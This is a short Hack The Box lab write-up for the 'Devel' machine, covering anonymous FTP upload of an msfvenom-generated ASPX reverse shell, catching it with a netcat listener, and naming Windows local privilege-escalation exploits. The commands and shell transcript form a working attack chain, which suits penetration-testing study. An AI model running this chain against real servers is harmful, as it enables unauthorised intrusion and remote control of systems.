# Hack The Box - Devel

nmap to find http and ftp are open. You can log in ftp with anonymous and use the `put ~/test/newaspcmd.asp /newaspcmd.asp` to upload a shell/backdoor. Can generate one with msfvenom from below. Once you have a reverse shell, you can move exploits over. Remember that to move binaries you need to set the FTP binary mode on, otherwise you will get "This program can not be run in DOS mode" when trying to execute it. ms11-046.exe AFD.sys exploit works and can be found https://pentestlab.blog/tag/local-exploits/. To nagivate via the windows terminal is different. Use type to read files, dir to list directories, syteminfo for more information. More info for reconnaissance can be found here http://www.fuzzysecurity.com/tutorials/16.html

```
root@kali:~# msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.129 LPORT=1234 -e x86/shikata_ga_nai -f aspx -o ~/test/shell.aspx
root@kali:~# ftp 10.10.10.5
Connected to 10.10.10.5.
220 Microsoft FTP Service
Name (10.10.10.5:root): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password:
230 User logged in.
Remote system type is Windows_NT.
ftp> put ~/test/shell.aspx /shell.aspx
local: /root/test/shell.aspx remote: /shell.aspx
200 PORT command successful.
125 Data connection already open; Transfer starting.
226 Transfer complete.
2889 bytes sent in 0.00 secs (42.3872 MB/s)

root@kali:~# nc -lvp 1234
(visit webiste where it is located)

listening on [any] 1234 ...
10.10.10.5: inverse host lookup failed: Unknown host
connect to [10.10.14.129] from (UNKNOWN) [10.10.10.5] 49162
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

c:\windows\system32\inetsrv>

Now you can use ms10_015 kitrap0d exploit
```


